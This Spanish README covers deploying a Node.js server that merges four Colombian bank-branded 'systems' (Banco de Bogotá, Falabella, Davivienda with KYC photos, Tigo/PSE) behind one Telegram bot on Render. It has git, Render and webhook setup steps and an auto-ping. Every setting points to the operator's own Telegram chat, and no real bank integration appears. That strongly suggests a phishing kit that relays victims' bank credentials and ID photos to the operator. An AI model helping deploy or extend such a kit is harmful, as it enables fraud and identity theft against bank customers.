# 🚀 SERVIDOR UNIFICADO - TODOS LOS BANCOS

Servidor único que integra 4 sistemas bancarios para Telegram Bot + Render.

## 🏦 SISTEMAS INTEGRADOS

1. ✅ **Banco de Bogotá** - Clave Segura
2. ✅ **Falabella** - Suite de Espera  
3. ✅ **Davivienda** - KYC con fotos
4. ✅ **Sistema Tigo** - Consulta + PSE

## 🚀 DEPLOY RÁPIDO EN RENDER

### 1. Subir a GitHub

```bash
git init
git add .
git commit -m "Servidor unificado"
git remote add origin <tu-repo>
git push -u origin main
```

### 2. Deploy en Render

1. Ve a https://render.com
2. **New +** → **Web Service**
3. Conecta tu repositorio
4. **Build Command:** `npm install`
5. **Start Command:** `npm start`
6. **Environment:**
   - `BOT_TOKEN` = Tu token de Telegram
   - `CHAT_ID` = Tu chat ID
7. **Create Web Service**

### 3. Configurar Webhook

Abre en navegador:
```
https://tu-app.onrender.com/setWebhook
```

¡Listo! 🎉

## 🔧 INSTALACIÓN LOCAL

```bash
npm install
```

Crea `.env`:
```env
BOT_TOKEN=tu_token
CHAT_ID=tu_chat_id
PORT=3000
```

Ejecuta:
```bash
npm start
```

## ✅ CARACTERÍSTICAS

- ✅ 1 servidor en vez de 4
- ✅ 1 webhook unificado
- ✅ Auto-ping (evita sleep en Render)
- ✅ Soporte para fotos (KYC)

## 🎯 VERSIÓN

**1.0.0** - Servidor unificado completo
